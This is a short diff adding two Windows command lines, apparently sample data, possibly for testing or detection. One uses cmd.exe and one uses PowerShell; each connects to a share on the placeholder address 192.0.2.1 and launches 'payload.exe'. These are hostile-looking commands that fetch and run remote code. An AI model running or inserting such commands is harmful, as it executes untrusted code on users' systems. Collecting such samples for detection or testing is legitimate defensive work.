@@ -1,0 +1,2 @@
+cmd.exe /c " net use https://192.0.2.1/share & start payload.exe "
+powershell.exe -Command "net use http://192.0.2.1/share; Start-Process payload.exe "
